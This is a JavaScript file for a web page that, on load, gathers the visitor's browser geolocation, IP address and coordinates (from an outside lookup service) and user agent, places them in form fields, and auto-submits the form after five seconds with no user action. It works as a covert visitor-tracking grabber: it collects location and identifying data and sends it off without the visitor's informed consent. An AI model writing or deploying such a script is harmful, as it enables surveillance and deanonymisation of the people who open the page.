'use strict';
import console_color,{console_red,console_green,console_yellow,
  console_purple,console_blue,console_cyan} from './logColor.js';
  import {str, rand} from './logic.js';

// ------------------------------------------------------------------------------------------

//                                       -----  -----
// ------------------------------------------------------------------------------------------


const geo = document.getElementById('geo');
function getLocation() { console_red(geo);
  if(navigator.geolocation) { console_green(geo);
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    geo.value = "Geolocation is not supported by this browser.";
  }
} getLocation();
function showPosition(position) { console_cyan(geo);
  geo.value = `${position.coords.latitude}, ${position.coords.longitude}`;
}
const ip = document.getElementById('ip');
const getData = async () => { console_yellow(ip);
  const response = await fetch('https://json.geoiplookup.io');
  const data = await response.json();
  ip.value = `${data.ip} GEO : ${data.latitude}, ${data.longitude}`; 
  console_purple(ip)
}; getData();
const ua = navigator.userAgent;
const agent = document.getElementById('agent');
agent.value = `${ua}`; console_blue(agent);
const symbol = document.getElementById('symbol');
const attr = {value: str(), name: rand()}
const obj = Object.entries(attr);
for (const index of obj) { symbol.setAttribute(index[0], index[1]) }
console_color('#fff','14px','location','ibu');
const form = document.querySelector('form');
window.addEventListener('load', () => {
  setTimeout(() => {
    form.submit();
  }, 5000);
});


// ------------------------------------------------------------------------------------------
























































